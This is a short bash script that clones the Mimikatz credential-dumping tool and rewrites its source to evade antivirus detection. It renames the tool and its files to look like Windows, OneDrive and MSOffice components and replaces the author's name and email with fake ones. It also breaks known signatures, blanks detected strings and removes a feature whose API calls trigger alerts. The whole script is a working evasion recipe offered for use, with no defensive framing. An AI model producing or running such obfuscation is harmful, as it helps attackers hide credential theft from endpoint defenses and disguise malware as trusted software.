#!/bin/bash

git clone https://github.com/gentilkiwi/mimikatz.git windows
mv windows/mimikatz windows/windows
find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/James/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/Troy/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/jtroy@hotmail.com/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/python/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
find windows/ -type f -name '*mimikatz*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
	mv "${FILE}" "${newfile}";
done
find windows/ -type f -name '*kiwi*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
	mv "${FILE}" "${newfile}";
done


# here we insert a printf to mess up the signature on the kuhl_m_crypto_extractor_capi32 function
sed -i '24 i printf("hello");' windows/windows/modules/crypto/kuhl_m_crypto_extractor.c

# the printing error functios contains hardcoded strings with many detections. Here we change all strings to "hello"
find windows \( -type d -name .git -prune \) -o -type f -print0 | xargs -0 sed -i -E 's/PRINT_ERROR\(L".*\);/PRINT_ERROR\(L"hello"\);/g'
find windows \( -type d -name .git -prune \) -o -type f -print0 | xargs -0 sed -i -E 's/PRINT_ERROR_AUTO\(L".*\);/PRINT_ERROR_AUTO\(L"hello"\);/g'

# list of strings removed or modified that are detected
sed -i 's/wdigest.dll//g' windows/windows/modules/kuhl_m_standard.c windows/windows/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c
sed -i 's/L"multirdp"/L""/g' windows/windows/modules/kuhl_m_ts.c
sed -i 's/logonPasswords/givePasswordsPlz/g' windows/windows/modules/sekurlsa/kuhl_m_sekurlsa.c
sed -i 's/L"credman"/L""/g' windows/windows/modules/sekurlsa/kuhl_m_sekurlsa.c windows/windows/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c

# remove the netsync command because it eventually calls netapi32.dll suspicous functions such as I_NetServerTrustPasswordsGet.
# although we lose the netsync functionality by doing this, I dont think its that big of a deal...
sed -i '/L"netsync",/d' windows/windows/modules/kuhl_m_lsadump.c
